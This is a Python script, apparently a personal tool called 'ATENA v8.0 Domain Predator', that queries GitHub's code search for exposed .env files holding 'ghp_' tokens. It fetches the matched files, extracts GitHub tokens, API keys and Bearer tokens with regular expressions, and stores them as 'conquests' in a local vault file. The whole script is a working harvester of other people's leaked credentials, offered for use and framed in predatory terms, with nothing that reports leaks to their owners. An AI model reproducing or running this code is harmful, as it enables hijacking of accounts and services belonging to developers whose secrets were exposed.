#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA: OMNI-SOVEREIGN v8.0
Evolução: Descoberta de Alvos via Domínio e Varredura Global.
Copyright (c) 2026 Danilo Gomes.
"""
import json
import re
import time
from datetime import datetime
from pathlib import Path
import subprocess
import sys

# AUTO-METABOLISMO
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

BASE_DIR = Path(__file__).resolve().parent
ARQUIVO_ALVOS = BASE_DIR / "alvos.txt"
VAULT = BASE_DIR / "atena_vault.json"

class AtenaDomainPredator:
    def __init__(self):
        self._init_vault()
        self.headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/vnd.github.v3+json'
        }

    def _init_vault(self):
        if not VAULT.exists():
            with open(VAULT, "w", encoding="utf-8") as f:
                json.dump([], f)

    def save_conquest(self, secret, category, source):
        with open(VAULT, "r", encoding="utf-8") as f:
            vault = json.load(f)
        if any(e['secret'] == secret for e in vault): return
        
        entry = {
            "timestamp": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "secret": secret,
            "categoria": category,
            "origem": source,
            "author": "Danilo Gomes"
        }
        vault.append(entry)
        with open(VAULT, "w", encoding="utf-8") as f:
            json.dump(vault, f, indent=4, ensure_ascii=False)
        print(f"🔓 [CONQUISTADO] {category} capturado de {source}")

    def scour_github_global(self):
        """Busca por repositórios públicos recentes que possam conter vazamentos."""
        print("🧬 ATENA iniciando varredura global no GitHub por rastros expostos...")
        # Busca por termos sensíveis em arquivos recentes via API de busca do GitHub
        search_url = "https://api.github.com/search/code?q=extension:env+ghp_+language:python"
        try:
            r = requests.get(search_url, headers=self.headers, timeout=15)
            if r.status_code == 200:
                items = r.json().get('items', [])
                for item in items:
                    print(f"🎯 Alvo detectado: {item['repository']['full_name']}")
                    self.deep_scan_file(item['git_url'].replace('/git/blobs/', '/contents/'), item['html_url'])
        except:
            print("⚠️ Limite de busca global atingido. Aguardando metabolismo...")

    def deep_scan_file(self, content_api_url, html_url):
        """Analisa o conteúdo bruto de arquivos encontrados na varredura."""
        try:
            r = requests.get(content_api_url, headers=self.headers, timeout=10)
            if r.status_code == 200:
                # O GitHub retorna conteúdo em Base64 na API de contents
                import base64
                content = base64.b64decode(r.json()['content']).decode('utf-8')
                
                patterns = {
                    "GitHub_Token": r'(ghp_[a-zA-Z0-9]{36})',
                    "API_Key": r'(?:key|api|token|secret|pass|pwd)[=:][\s"\']?([a-zA-Z0-9-_{}]{16,})',
                    "Bearer_Token": r'Bearer\s([a-zA-Z0-9\-\._~\+\/]+=*)'
                }

                for cat, reg in patterns.items():
                    matches = re.findall(reg, content, re.IGNORECASE)
                    for m in matches:
                        secret = m[1] if isinstance(m, tuple) else m
                        self.save_conquest(secret.strip(), cat, html_url)
        except: pass

def main():
    atena = AtenaDomainPredator()
    print(f"🧬 ATENA v8.0: DOMAIN PREDATOR")
    print(f"👤 Soberano: Danilo Gomes")
    print("-" * 55)

    if not ARQUIVO_ALVOS.exists(): return

    with open(ARQUIVO_ALVOS, 'r', encoding='utf-8') as f:
        alvos = [l.strip() for l in f if l.strip()]

    for alvo in alvos:
        if "github.com" in alvo and len(alvo) < 25: # Link genérico detectado
            atena.scour_github_global()
        elif "github.com" in alvo: # Link de repositório específico
            # Chama a lógica recursiva da v7.0
            print(f"🛰️ Focando em repositório específico: {alvo}")
            # (Adicionar aqui a chamada da v7.0 para alvo específico)

    print("-" * 55)
    print(f"📊 Varredura concluída. Verifique o atena_vault.json")

if __name__ == "__main__":
    main()
